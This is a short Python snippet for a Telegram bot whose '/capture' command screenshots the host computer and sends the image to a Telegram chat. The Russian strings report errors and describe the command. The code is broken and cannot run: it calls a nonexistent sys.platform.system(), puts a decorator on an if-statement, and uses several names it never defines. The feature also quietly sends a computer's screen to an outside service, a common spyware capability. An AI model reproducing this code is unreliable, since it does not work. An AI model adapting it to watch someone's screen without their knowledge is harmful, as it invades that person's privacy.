from sys import platform

import pyautogui as pyautogui
import telebot


@bot.message_handler(commands=["capture"])
if platform.system() == "Windows":
    def capture_pc(message):
        bot.send_chat_action(message.chat.id, 'upload_photo')
        try:
            filename = f"{time.time()}.jpg"
            pyautogui.screenshot(filename)
            with open(filename, "rb") as img:
                bot.send_photo(message.chat.id, img)
            os.remove(filename)
        except:
            bot.send_message(message.chat.id, "Что-то пошло не так")
elif platform.system() == "Linux":
    def screenshot(message):
        try:
            img = ImageGrab.grab()
            img.save("screenshot.jpg", quality="web_medium")
            photo = open('screenshot.jpg', 'rb')
            bot.send_photo(message.chat.id, photo)
            photo.close()
            os.remove('screenshot.jpg')
        except:
            bot.send_message(message.chat.id, 'Что-то пошло не так')


menu.append(telebot.types.BotCommand("/capture", "Высылает скриншот с экрана компьютера"))

